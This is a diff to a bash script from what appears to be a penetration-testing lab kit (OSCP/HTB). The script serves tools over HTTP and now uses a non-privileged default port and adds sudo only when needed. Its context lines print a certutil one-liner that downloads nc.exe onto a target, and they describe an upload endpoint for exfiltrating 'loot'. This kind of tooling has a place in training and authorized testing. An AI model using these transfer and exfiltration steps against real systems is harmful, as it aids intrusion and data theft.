@@ -7,7 +7,12 @@ KIT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
 #   2. fuzzy-httpserver  - typo-tolerant: serves the right file even if the wget path has a typo
 #   3. python http.server - download only, always present
 cd "$KIT/serve" || exit 1
-PORT="${1:-80}"
+PORT="${1:-7890}"
+
+# Ports <1024 need root to bind; the default (7890) does not, so don't force a
+# sudo password prompt when it isn't required.
+SUDO=""
+[ "$PORT" -lt 1024 ] && SUDO="sudo"
 
 # --- auto-detect the VPN IP so the printed one-liners are paste-ready ---
 # Prefer tun0 (OSCP/HTB/PG VPN); fall back to the first global-scope address.
@@ -24,11 +29,11 @@ echo "    Windows:  certutil -urlcache -f http://$KALI:$PORT/windows/nc.exe nc.e
 
 if command -v updog >/dev/null; then
   echo "    (updog: browser upload at http://$KALI:$PORT/upload - exfil loot back; uploads land in $(pwd))"
-  sudo "$(command -v updog)" -d . -p "$PORT"
+  $SUDO "$(command -v updog)" -d . -p "$PORT"
 elif command -v fuzzy-httpserver >/dev/null; then
   echo "    (fuzzy-httpserver: typo-tolerant matching enabled; download only)"
-  sudo "$(command -v fuzzy-httpserver)" -p "$PORT" -d .
+  $SUDO "$(command -v fuzzy-httpserver)" -p "$PORT" -d .
 else
   echo "    (python http.server: download only. 'pip install updog' to add an upload endpoint.)"
-  sudo python3 -m http.server "$PORT"
+  $SUDO python3 -m http.server "$PORT"
 fi
